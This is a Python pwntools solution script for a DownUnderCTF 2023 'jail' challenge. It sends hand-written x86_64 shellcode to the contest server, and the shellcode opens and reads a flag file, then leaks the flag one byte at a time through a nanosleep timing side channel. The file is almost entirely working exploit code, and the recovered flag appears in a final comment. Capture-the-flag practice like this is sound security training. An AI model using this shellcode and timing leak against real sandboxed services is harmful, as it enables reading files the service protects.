from pwn import *
import time

context.arch = "x86_64"

@context.quietfunc
def run():
    flag = "DUCTF{"
    guess = 0
    position = len(flag)

    while flag[-1] != "}":
        position += 1
        print(flag)
        print(position)
        for guess in range(0x20, 0x7f):
            #p = process("./jail")
            # gdb.attach(p)

            p = remote("2023.ductf.dev", 30010)

            # first two syscalls
            # sh  = shellcraft.open("/chal/flag.txt")
            # sh += shellcraft.read(3, 'rsp', 0x1000)

            sh = f'''/* open(file='/chal/flag.txt', oflag=0, mode=0) */
                /* push b'/chal/flag.txt\x00' */
                mov rax, 0x101010101010101
                push rax
                mov rax, 0x101010101010101 ^ 0x7478742e6761
                xor [rsp], rax
                mov rax, 0x6c662f6c6168632f
                push rax
                mov rsi, rsp
                xor edx, edx /* 0 */
                xor edi, edi /* 0 */
                /* call openat() */
                push 257 /* 257 */
                pop rax
                syscall
                /* call read(3, 'rsp', 0x1000) */
                xor eax, eax /* SYS_read */
                push 3
                pop rdi
                xor edx, edx
                mov dh, 0x1000 >> 8
                mov rsi, rsp
                syscall /* her har vi flagget i rsi */
                xor edx, edx
                mov dl, byte ptr [rsi+{position}]
                cmp rdx, {guess}
                jne WRONG
                /* nanosleep to indicate success */
                pushq 0
                pushq 9
                mov rdi, rsp
                /* call nanosleep() */
                push 35
                pop rax
                syscall
            WRONG:
                /* exit(status=0) */
                xor edi, edi /* 0 */
                /* call exit() */
                push SYS_exit /* 0x3c */
                pop rax
                syscall
            '''

            assembly = asm(sh)

            # log.info(b"asm:" + assembly)
            # log.info(b"length: " + str(len(assembly)).encode())

            start = time.time()
            p.recvuntil(b"what is your escape plan?\n > ")
            p.sendline(assembly)
            p.recvall()

            end=time.time()
            dur = end-start

            if dur > 9:
                flag += chr(guess)
                break

with context.local(log_level='info'): run()

"""
NR	syscall name	references	%rax	arg0 (%rdi)	                        arg1 (%rsi)	                    arg2 (%rdx)	    arg3 (%r10)	
0	read	        man/ cs/	0x00	unsigned int fd	                    char *buf	                    size_t count
35	nanosleep	    man/ cs/	0x23	struct __kernel_timespec *rqtp	    struct __kernel_timespec *rmtp
60	exit	        man/ cs/	0x3c	int error_code
257	openat	        man/ cs/	0x101	int dfd	                            const char *filename	        int flags	    umode_t mode
"""

#DUCTF{S1de_Ch@nN3l_aTT4ckS_aRe_Pr3tTy_c00L!}
